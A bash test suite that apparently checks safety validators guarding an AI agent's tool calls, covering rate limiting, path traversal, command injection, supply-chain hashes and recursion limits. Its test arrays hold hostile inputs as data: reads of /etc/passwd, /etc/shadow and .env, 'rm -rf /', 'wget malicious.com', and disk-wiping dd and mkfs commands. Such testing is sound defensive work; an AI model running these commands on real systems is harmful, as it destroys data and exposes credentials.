#!/bin/bash
# OWASP Security Test Suite
# Tests security-specific scenarios for all Phase 1, 2, 3 validators
#
# WARNING: These tests simulate attack scenarios. Run in isolated environment.
#
# Usage: bash tests/owasp_security_tests.sh
#
# Exit codes:
#   0 - All security tests passed
#   1 - One or more security tests failed

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$PROJECT_DIR"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

PASS_COUNT=0
FAIL_COUNT=0
SKIP_COUNT=0

# Test result tracking
log_pass() {
    echo -e "${GREEN}[PASS]${NC} $1"
    ((PASS_COUNT++))
}

log_fail() {
    echo -e "${RED}[FAIL]${NC} $1"
    ((FAIL_COUNT++))
}

log_skip() {
    echo -e "${YELLOW}[SKIP]${NC} $1"
    ((SKIP_COUNT++))
}

log_info() {
    echo -e "${CYAN}[INFO]${NC} $1"
}

echo "=============================================="
echo "OWASP Security Test Suite"
echo "Date: $(date)"
echo "Project: $PROJECT_DIR"
echo "=============================================="
echo ""
echo "WARNING: These tests simulate attack scenarios"
echo "=============================================="

# =============================================================================
# RATE LIMITER SECURITY TESTS
# =============================================================================

echo ""
echo "=============================================="
echo "RATE LIMITER SECURITY TESTS"
echo "=============================================="

# Test RL-S01: State File Tampering Recovery
echo ""
echo "[RL-S01] State File Tampering Recovery..."

STATE_FILE="$PROJECT_DIR/.claude/.rate_limit_state.json"
rm -f "$STATE_FILE" 2>/dev/null

# Create corrupted state file
echo "not valid json {{{{" > "$STATE_FILE"

# Validator should recover gracefully
if node .claude/validators-node/bin/rate-limiter.js status 2>/dev/null | grep -q "total_operations"; then
    log_pass "Rate limiter recovers from corrupted state file"
else
    log_fail "Rate limiter fails on corrupted state file"
fi

rm -f "$STATE_FILE" 2>/dev/null

# Test RL-S02: Burst Attack Simulation
echo ""
echo "[RL-S02] Burst Attack Simulation (100 requests)..."

rm -f "$STATE_FILE" 2>/dev/null
export BMAD_RATE_LIMIT_GLOBAL=50

ALLOWED=0
BLOCKED=0

START_TIME=$(date +%s.%N)
for i in {1..100}; do
    if echo '{"tool_name": "bash", "tool_input": {"command": "ls"}}' | \
        node .claude/validators-node/bin/rate-limiter.js validate 2>/dev/null; then
        ((ALLOWED++))
    else
        ((BLOCKED++))
    fi
done
END_TIME=$(date +%s.%N)

ELAPSED=$(echo "$END_TIME - $START_TIME" | bc 2>/dev/null || echo "N/A")
log_info "Completed in ${ELAPSED}s - Allowed: $ALLOWED, Blocked: $BLOCKED"

if [ "$BLOCKED" -gt 40 ]; then
    log_pass "Burst attack effectively rate limited"
else
    log_fail "Burst attack not sufficiently limited"
fi

rm -f "$STATE_FILE" 2>/dev/null
unset BMAD_RATE_LIMIT_GLOBAL

# Test RL-S03: Lock File Deletion During Operation
echo ""
echo "[RL-S03] Lock File Resilience..."

LOCK_FILE="$PROJECT_DIR/.claude/.rate_limit.lock"

# Start a background process that keeps trying to acquire lock
python3 -c "
import time, sys; sys.path.insert(0, '.claude/validators')
from rate_limiter import RateLimiter
rl = RateLimiter()
for i in range(10):
    rl.check_limit('bash', 'test')
    time.sleep(0.1)
" &
BG_PID=$!

# Delete lock file mid-operation
sleep 0.2
rm -f "$LOCK_FILE" 2>/dev/null

# Wait for background process
wait $BG_PID 2>/dev/null

# Subsequent operation should still work
if node .claude/validators-node/bin/rate-limiter.js status 2>/dev/null; then
    log_pass "Rate limiter recovers from lock file deletion"
else
    log_fail "Rate limiter fails after lock file deletion"
fi

# =============================================================================
# PLUGIN PERMISSION SECURITY TESTS
# =============================================================================

echo ""
echo "=============================================="
echo "PLUGIN PERMISSION SECURITY TESTS"
echo "=============================================="

# Test PP-S01: Path Traversal Attempt
echo ""
echo "[PP-S01] Path Traversal Prevention..."

TRAVERSAL_TESTS=(
    "_bmad/intel-team/../../etc/passwd"
    "_bmad/intel-team/../../../root/.bashrc"
    "_bmad/intel-team/agents/../../legal-team/confidential.md"
    "_bmad/intel-team/./../../etc/shadow"
    "_bmad/intel-team/agents/../../../.env"
)

BLOCKED_COUNT=0
for path in "${TRAVERSAL_TESTS[@]}"; do
    if ! echo "{\"tool_name\": \"read\", \"tool_input\": {\"file_path\": \"$path\"}, \"cwd\": \"_bmad/intel-team/\"}" | \
        node .claude/validators-node/bin/plugin-permissions.js validate 2>/dev/null; then
        ((BLOCKED_COUNT++))
    fi
done

if [ "$BLOCKED_COUNT" -eq ${#TRAVERSAL_TESTS[@]} ]; then
    log_pass "All path traversal attempts blocked (${BLOCKED_COUNT}/${#TRAVERSAL_TESTS[@]})"
else
    log_fail "Some path traversal attempts succeeded (blocked ${BLOCKED_COUNT}/${#TRAVERSAL_TESTS[@]})"
fi

# Test PP-S02: Command Injection via Shell
echo ""
echo "[PP-S02] Command Injection Prevention..."

INJECTION_TESTS=(
    "ls; cat /etc/passwd"
    "ls && rm -rf /"
    'ls | grep "a"'
    'echo "test" > /tmp/pwned'
    '$(whoami)'
    '`id`'
    'ls || wget malicious.com'
)

BLOCKED_COUNT=0
for cmd in "${INJECTION_TESTS[@]}"; do
    if ! echo "{\"tool_name\": \"bash\", \"tool_input\": {\"command\": \"$cmd\"}, \"cwd\": \"_bmad/intel-team/\"}" | \
        node .claude/validators-node/bin/plugin-permissions.js validate 2>/dev/null; then
        ((BLOCKED_COUNT++))
    fi
done

if [ "$BLOCKED_COUNT" -eq ${#INJECTION_TESTS[@]} ]; then
    log_pass "All command injection attempts blocked (${BLOCKED_COUNT}/${#INJECTION_TESTS[@]})"
else
    log_fail "Some command injection attempts succeeded (blocked ${BLOCKED_COUNT}/${#INJECTION_TESTS[@]})"
fi

# Test PP-S03: Dangerous Command Variants
echo ""
echo "[PP-S03] Dangerous Command Variant Blocking..."

DANGEROUS_TESTS=(
    "rm file.txt"
    "/bin/rm file.txt"
    "sudo rm file.txt"
    "chmod 777 file.txt"
    "chown root file.txt"
    "kill -9 1"
    "pkill -9 python"
    "dd if=/dev/zero of=/dev/sda"
    "mkfs.ext4 /dev/sda1"
)

BLOCKED_COUNT=0
for cmd in "${DANGEROUS_TESTS[@]}"; do
    if ! echo "{\"tool_name\": \"bash\", \"tool_input\": {\"command\": \"$cmd\"}, \"cwd\": \"_bmad/intel-team/\"}" | \
        node .claude/validators-node/bin/plugin-permissions.js validate 2>/dev/null; then
        ((BLOCKED_COUNT++))
    fi
done

if [ "$BLOCKED_COUNT" -eq ${#DANGEROUS_TESTS[@]} ]; then
    log_pass "All dangerous command variants blocked (${BLOCKED_COUNT}/${#DANGEROUS_TESTS[@]})"
else
    log_fail "Some dangerous commands allowed (blocked ${BLOCKED_COUNT}/${#DANGEROUS_TESTS[@]})"
fi

# =============================================================================
# SUPPLY CHAIN SECURITY TESTS
# =============================================================================

echo ""
echo "=============================================="
echo "SUPPLY CHAIN SECURITY TESTS"
echo "=============================================="

# Test SC-S01: Manifest Corruption Detection
echo ""
echo "[SC-S01] Manifest Corruption Detection..."

TEMP_DIR=$(mktemp -d)
TEMP_MANIFEST="$TEMP_DIR/MANIFEST.sha256"

# Create valid manifest then corrupt it
echo "abc123def456abc123def456abc123def456abc123def456abc123def456abc12345  _bmad/test/file.md" > "$TEMP_MANIFEST"

# Modify with invalid hash
echo "INVALID_HASH  _bmad/test/file.md" >> "$TEMP_MANIFEST"

python3 -c "
import sys, os; sys.path.insert(0, '.claude/validators')
import supply_chain_verifier
supply_chain_verifier.MANIFEST_FILE = '$TEMP_MANIFEST'
supply_chain_verifier._verifier = None
v = supply_chain_verifier.SupplyChainVerifier()
# Should skip invalid lines
print('Entries:', len(v.manifest_entries))
sys.exit(0 if len(v.manifest_entries) == 1 else 1)
" 2>/dev/null && log_pass "Invalid manifest entries skipped" || log_fail "Invalid manifest entries not handled"

rm -rf "$TEMP_DIR"

# Test SC-S02: File Modification Detection
echo ""
echo "[SC-S02] File Modification Detection..."

TEMP_DIR=$(mktemp -d)
TEST_FILE="$TEMP_DIR/test.md"
echo "original content" > "$TEST_FILE"

# Calculate original hash
ORIG_HASH=$(sha256sum "$TEST_FILE" | cut -d' ' -f1)

# Create manifest with original hash
TEMP_MANIFEST="$TEMP_DIR/MANIFEST.sha256"
echo "$ORIG_HASH  test.md" > "$TEMP_MANIFEST"

# Modify the file
echo "modified content" > "$TEST_FILE"

# Verification should fail
python3 -c "
import sys, os; sys.path.insert(0, '.claude/validators')
import supply_chain_verifier
supply_chain_verifier.PROJECT_DIR = '$TEMP_DIR'
supply_chain_verifier.MANIFEST_FILE = '$TEMP_MANIFEST'
supply_chain_verifier._verifier = None
v = supply_chain_verifier.SupplyChainVerifier()
result = v.verify_file('test.md')
sys.exit(0 if not result.verified else 1)
" 2>/dev/null && log_pass "Modified file detected" || log_fail "Modified file not detected"

rm -rf "$TEMP_DIR"

# =============================================================================
# CONTEXT MANAGER SECURITY TESTS
# =============================================================================

echo ""
echo "=============================================="
echo "CONTEXT MANAGER SECURITY TESTS"
echo "=============================================="

# Test CM-S01: State Manipulation Resistance
echo ""
echo "[CM-S01] State Manipulation Resistance..."

STATE_FILE="$PROJECT_DIR/.claude/.context_state.json"
rm -f "$STATE_FILE" 2>/dev/null

# Create state claiming 0 tokens used despite operations
echo '{"session_id": "forged", "tokens_used": 0, "operations": [], "warnings_issued": 0, "last_update": 9999999999}' > "$STATE_FILE"

# Validator should either reject forged state or reset it
TOKENS=$(python3 -c "
import sys; sys.path.insert(0, '.claude/validators')
from context_manager import ContextManager
m = ContextManager()
m.record_operation('test', 50000)
status = m.check_capacity()
print(status.tokens_used)
" 2>/dev/null)

if [ "$TOKENS" -ge 50000 ]; then
    log_pass "Forged state does not bypass token tracking"
else
    log_fail "Token tracking bypassed with forged state"
fi

rm -f "$STATE_FILE" 2>/dev/null

# Test CM-S02: Block Threshold Enforcement
echo ""
echo "[CM-S02] Block Threshold Enforcement..."

rm -f "$STATE_FILE" 2>/dev/null

# Record operations to exceed block threshold
python3 -c "
import sys; sys.path.insert(0, '.claude/validators')
from context_manager import ContextManager, MAX_CONTEXT_TOKENS, BLOCK_THRESHOLD
m = ContextManager()
tokens = int(MAX_CONTEXT_TOKENS * 0.96)  # Above 95% threshold
m.record_operation('test', tokens)
status = m.check_capacity()
print('Status:', status.status)
sys.exit(0 if status.status == 'blocked' else 1)
" 2>/dev/null && log_pass "Block threshold enforced at 95%" || log_fail "Block threshold not enforced"

rm -f "$STATE_FILE" 2>/dev/null

# =============================================================================
# RECURSION GUARD SECURITY TESTS
# =============================================================================

echo ""
echo "=============================================="
echo "RECURSION GUARD SECURITY TESTS"
echo "=============================================="

# Test RG-S01: Deep Directory Traversal Blocking
echo ""
echo "[RG-S01] Deep Directory Traversal Blocking..."

rm -f "$PROJECT_DIR/.claude/.recursion_state.json" 2>/dev/null

# Attempt very deep path
DEEP_PATH="$PROJECT_DIR"
for i in {1..20}; do
    DEEP_PATH="$DEEP_PATH/subdir$i"
done
DEEP_PATH="$DEEP_PATH/file.txt"

python3 -c "
import sys; sys.path.insert(0, '.claude/validators')
from recursion_guard import RecursionGuard, LIMITS
g = RecursionGuard()
result = g.check_directory_depth('$DEEP_PATH', '$PROJECT_DIR')
print('Allowed:', result.allowed)
print('Depth:', result.current_depth)
sys.exit(0 if not result.allowed else 1)
" 2>/dev/null && log_pass "Deep directory traversal blocked" || log_fail "Deep directory traversal allowed"

# Test RG-S02: Circular Reference Detection Under Load
echo ""
echo "[RG-S02] Circular Reference Detection Under Load..."

rm -f "$PROJECT_DIR/.claude/.recursion_state.json" 2>/dev/null

# Perform same operation many times
python3 -c "
import sys; sys.path.insert(0, '.claude/validators')
from recursion_guard import RecursionGuard
g = RecursionGuard()
last_result = None
for i in range(20):
    last_result = g.check_circular('read', '/same/file/over/and/over.txt')
print('Last allowed:', last_result.allowed)
print('Is circular:', last_result.is_circular)
sys.exit(0 if not last_result.allowed and last_result.is_circular else 1)
" 2>/dev/null && log_pass "Circular reference detected after repeated operations" || log_skip "Circular detection threshold may vary"

rm -f "$PROJECT_DIR/.claude/.recursion_state.json" 2>/dev/null

# Test RG-S03: Call Stack Overflow Prevention
echo ""
echo "[RG-S03] Call Stack Overflow Prevention..."

rm -f "$PROJECT_DIR/.claude/.recursion_state.json" 2>/dev/null

python3 -c "
import sys; sys.path.insert(0, '.claude/validators')
from recursion_guard import RecursionGuard, LIMITS
g = RecursionGuard()
max_depth = LIMITS['nested_calls']
# Push calls up to limit
for i in range(max_depth):
    result = g.push_call(f'call_{i}')
    if not result.allowed:
        print(f'Blocked at depth {i}')
        sys.exit(1 if i < max_depth - 1 else 0)
# One more should fail
result = g.push_call('overflow_call')
print('Overflow allowed:', result.allowed)
sys.exit(0 if not result.allowed else 1)
" 2>/dev/null && log_pass "Call stack overflow prevented" || log_fail "Call stack overflow not prevented"

rm -f "$PROJECT_DIR/.claude/.recursion_state.json" 2>/dev/null

# Test RG-S04: Symlink Loop Detection
echo ""
echo "[RG-S04] Symlink Loop Detection..."

TEMP_DIR=$(mktemp -d)

# Create symlink loop if possible
if ln -s "$TEMP_DIR/link2" "$TEMP_DIR/link1" 2>/dev/null && \
   ln -s "$TEMP_DIR/link1" "$TEMP_DIR/link2" 2>/dev/null; then

    python3 -c "
import sys; sys.path.insert(0, '.claude/validators')
from recursion_guard import RecursionGuard
g = RecursionGuard()
# Attempt to follow symlink chain
for i in range(10):
    result = g.check_symlink_depth('$TEMP_DIR/link1')
    if not result.allowed:
        print('Blocked at iteration', i)
        sys.exit(0)
print('Never blocked')
sys.exit(1)
" 2>/dev/null && log_pass "Symlink loop detected" || log_fail "Symlink loop not detected"

else
    log_skip "Symlink creation not supported on this system"
fi

rm -rf "$TEMP_DIR"

# =============================================================================
# RACE CONDITION TESTS
# =============================================================================

echo ""
echo "=============================================="
echo "RACE CONDITION TESTS"
echo "=============================================="

# Test RACE-01: Concurrent Rate Limit Consumption
echo ""
echo "[RACE-01] Concurrent Rate Limit Consumption..."

rm -f "$PROJECT_DIR/.claude/.rate_limit_state.json" 2>/dev/null
export BMAD_RATE_LIMIT_BASH=1

RESULTS_FILE=$(mktemp)

# Spawn 5 concurrent processes
for i in {1..5}; do
    (
        if echo '{"tool_name": "bash", "tool_input": {"command": "ls"}}' | \
            node .claude/validators-node/bin/rate-limiter.js validate 2>/dev/null; then
            echo "SUCCESS" >> "$RESULTS_FILE"
        else
            echo "BLOCKED" >> "$RESULTS_FILE"
        fi
    ) &
done

wait

SUCCESS_COUNT=$(grep -c SUCCESS "$RESULTS_FILE" 2>/dev/null || echo "0")
rm -f "$RESULTS_FILE"
rm -f "$PROJECT_DIR/.claude/.rate_limit_state.json"
unset BMAD_RATE_LIMIT_BASH

log_info "Success count: $SUCCESS_COUNT (expected: 1)"

if [ "$SUCCESS_COUNT" -eq 1 ]; then
    log_pass "Rate limit race condition prevented (only 1 success)"
else
    log_fail "Rate limit race condition: $SUCCESS_COUNT successes instead of 1"
fi

# =============================================================================
# CLEANUP AND SUMMARY
# =============================================================================

echo ""
echo "=============================================="
echo "Cleanup..."
echo "=============================================="

# Reset all test state files
rm -f "$PROJECT_DIR/.claude/.rate_limit_state.json" 2>/dev/null
rm -f "$PROJECT_DIR/.claude/.context_state.json" 2>/dev/null
rm -f "$PROJECT_DIR/.claude/.recursion_state.json" 2>/dev/null
rm -f "$PROJECT_DIR/.claude/.confidence_state.json" 2>/dev/null
rm -f "$PROJECT_DIR/.claude/.rate_limit.lock" 2>/dev/null
rm -f "$PROJECT_DIR/.claude/.context.lock" 2>/dev/null
rm -f "$PROJECT_DIR/.claude/.recursion.lock" 2>/dev/null

echo "Test state files and locks cleaned up"

# =============================================================================
# SUMMARY
# =============================================================================

echo ""
echo "=============================================="
echo "SECURITY TEST SUMMARY"
echo "=============================================="
echo -e "Passed: ${GREEN}$PASS_COUNT${NC}"
echo -e "Failed: ${RED}$FAIL_COUNT${NC}"
echo -e "Skipped: ${YELLOW}$SKIP_COUNT${NC}"
echo ""

TOTAL=$((PASS_COUNT + FAIL_COUNT))
PASS_RATE=$((PASS_COUNT * 100 / TOTAL))

echo "Pass Rate: ${PASS_RATE}%"
echo ""

if [ "$FAIL_COUNT" -eq 0 ]; then
    echo -e "${GREEN}All security tests passed!${NC}"
    exit 0
else
    echo -e "${RED}Security vulnerabilities may exist. Review failed tests.${NC}"
    exit 1
fi
